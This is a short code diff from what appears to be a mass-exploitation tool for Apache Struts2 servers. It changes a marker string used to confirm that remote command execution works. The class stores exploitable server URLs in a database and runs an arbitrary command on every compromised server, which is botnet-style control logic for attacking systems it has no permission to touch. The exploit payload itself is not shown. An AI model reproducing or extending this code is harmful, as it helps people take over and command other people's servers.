@@ -16,13 +16,13 @@ class struts2:
         db = database()
         total = 0
         for server in db(db.servers.id > 0).select():
-            if 'VERIFICA_SE_O_SERVIDOR_ESTA_ONLINE' in self.exploit(server.url,'echo "VERIFICA_SE_O_SERVIDOR_ESTA_ONLINE"'):
+            if '065cd1ad45f099350c3b3404ca65761a0f6626eb' in self.exploit(server.url,'echo "065cd1ad45f099350c3b3404ca65761a0f6626eb"'):
                 self.exploit(server.url,cmd).strip()
                 total += 1
         return total
-         
+
     def add(self,url,):
-        if 'VERIFICA_SE_O_SERVIDOR_ESTA_ONLINE' in self.exploit(url,'echo "VERIFICA_SE_O_SERVIDOR_ESTA_ONLINE"'):
+        if '065cd1ad45f099350c3b3404ca65761a0f6626eb' in self.exploit(url,'echo "065cd1ad45f099350c3b3404ca65761a0f6626eb"'):
             db = database()
             db.servers.insert(url=url)
             db.commit()
